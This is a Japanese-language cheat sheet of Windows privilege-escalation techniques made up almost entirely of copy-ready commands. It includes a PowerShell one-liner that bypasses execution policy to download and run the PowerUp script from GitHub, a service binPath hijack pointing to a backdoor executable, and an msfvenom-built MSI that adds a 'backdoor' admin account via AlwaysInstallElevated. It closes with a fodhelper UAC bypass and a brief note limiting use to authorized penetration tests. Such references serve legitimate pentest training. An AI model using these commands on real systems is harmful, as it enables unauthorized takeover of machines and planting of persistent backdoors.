# Windows Privilege Escalation Techniques

## 情報収集

### システム情報の収集
```powershell
# システム情報
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# ホットフィックス
wmic qfe get Caption,Description,HotFixID,InstalledOn

# 環境変数
set
Get-ChildItem Env: | Format-Table -AutoSize
```

## 権限昇格の列挙

### PowerUp を使用した脆弱性スキャン
```powershell
# PowerUp のダウンロードと実行
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# SharpUp を使用した脆弱性スキャン
.\SharpUp.exe audit
```

## サービス権限昇格

### 脆弱なサービスの特定と悪用
```powershell
# サービスパーミッションの確認
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

# サービス設定の変更
sc qc upnphost
sc config upnphost binPath= "C:\path\to\backdoor.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost start= auto
net start upnphost
```

## レジストリ権限昇格

### AlwaysInstallElevated
```powershell
# レジストリキーの確認
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# MSIパッケージの作成と実行
msfvenom -p windows/adduser USER=backdoor PASS=password123 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## UAC バイパス

### UAC バイパステクニック
```powershell
# Fodhelper バイパス
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start C:\path\to\backdoor.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

## 注意事項
- これらの技術は、許可された環境でのペネトレーションテストでのみ使用してください
- システムの重要な機能に影響を与える可能性があります
- 実環境での使用は違法となる可能性があります 